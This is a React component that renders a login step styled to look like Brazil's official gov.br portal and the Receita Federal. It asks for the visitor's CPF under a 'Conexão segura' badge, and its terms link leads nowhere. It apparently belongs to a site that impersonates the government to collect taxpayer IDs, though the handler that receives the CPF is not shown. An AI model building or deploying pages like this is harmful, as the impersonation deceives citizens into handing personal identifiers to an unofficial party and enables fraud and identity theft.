"use client"

import { memo } from "react"
import { Shield, Lock, ArrowRight } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader } from "@/components/ui/card"
import { CPFInput } from "@/components/forms/cpf-input"
import { LoadingSpinner } from "@/components/ui/loading-spinner"

interface LoginStepProps {
  cpf: string
  onCPFChange: (value: string) => void
  onLogin: () => void
  isLoading: boolean
  showSuccess: boolean
  error: string | null
}

export const LoginStep = memo(({ cpf, onCPFChange, onLogin, isLoading, showSuccess, error }: LoginStepProps) => {
  const numbersOnly = cpf.replace(/\D/g, "")
  const isValid = numbersOnly.length >= 11 && !isLoading

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-blue-100 to-cyan-100">
      <main className="flex items-center justify-center min-h-screen px-4 py-12">
        <Card className="w-full max-w-md bg-white shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:scale-[1.02]">
          <CardHeader className="text-center pb-6">
            <div className="flex justify-center mb-4">
              <div className="text-4xl font-bold animate-pulse">
                <span className="text-blue-600">g</span>
                <span className="text-yellow-500">o</span>
                <span className="text-green-600">v</span>
                <span className="text-blue-600">.</span>
                <span className="text-blue-600">b</span>
                <span className="text-red-500">r</span>
              </div>
            </div>
            <h2 className="text-2xl font-bold text-gray-900 mb-2">CPF Brasil</h2>
            <p className="text-gray-600">Receita Federal do Brasil</p>
          </CardHeader>
          <CardContent className="space-y-6">
            <div className="flex items-start space-x-3 p-4 bg-gradient-to-r from-blue-50 to-cyan-50 rounded-lg border border-blue-200 hover:border-blue-300 transition-colors">
              <Shield className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" />
              <div className="text-sm text-blue-800">
                <span>Ao prosseguir, você concorda com nossos </span>
                <a href="#" className="text-blue-600 underline hover:text-blue-800 transition-colors">
                  Termos de Uso e Política de privacidade
                </a>
                <span>.</span>
              </div>
            </div>

            <CPFInput value={cpf} onChange={onCPFChange} disabled={isLoading} error={error} />

            <Button
              onClick={onLogin}
              className={`w-full py-3 text-lg font-medium rounded-lg transition-all duration-300 ${
                isValid
                  ? "bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white shadow-lg hover:shadow-xl transform hover:scale-[1.02]"
                  : "bg-gray-300 text-gray-500 cursor-not-allowed"
              }`}
              disabled={!isValid}
            >
              <div className="flex items-center justify-center space-x-2">
                {showSuccess || isLoading ? <LoadingSpinner /> : <ArrowRight className="w-5 h-5" />}
                <span>{isLoading ? "VERIFICANDO..." : "ENTRAR COM GOV.BR"}</span>
              </div>
            </Button>

            <div className="flex items-center justify-center space-x-2 text-sm text-gray-600">
              <Lock className="w-4 h-4" />
              <span>Conexão segura</span>
            </div>
          </CardContent>
        </Card>
      </main>
    </div>
  )
})

LoginStep.displayName = "LoginStep"
